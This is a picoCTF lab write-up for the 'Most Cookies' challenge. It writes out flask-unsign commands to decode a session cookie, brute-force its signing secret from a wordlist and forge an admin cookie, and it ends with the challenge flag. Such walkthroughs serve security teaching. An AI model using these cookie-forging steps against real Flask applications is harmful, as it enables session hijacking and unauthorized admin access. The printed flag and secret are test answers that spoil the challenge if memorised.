## Most Cookies

[Link to challenge](https://play.picoctf.org/practice/challenge/177)

Write-up:

1. We are given the server code. We notice a random secret key is picked from a 
list, and that is used to encode cookies. We need to set cookie `very_auth` to `admin`.
However, we don't know which key is being used to encode it, so we can brute-force it.

2. `flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aKXHRA.Tb-deBNQhRgZhgR1MRQYZCPLXRA'` allows
us to decode session cookie: `{'very_auth': 'blank'}`

3. To find out which secret key is being used, we use: <br>
`flask-unsign --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aKXHRA.Tb-deBNQhRgZhgR1MRQYZCPLXRA' --wordlist cookie_names.txt` <br>

This returns 'peanut butter'.

4. To forge `{'very_auth': 'admin'}`, we use: <br>
`flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'` <br>

This returns `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aKXKnw.F9BxFJ0hVg5EiWG1Zc9d8wti1AQ`, and setting 
session cookie to this value allows us to access `/display` and get flag: picoCTF{pwn_4ll_th3_cook1E5_22fe0842}
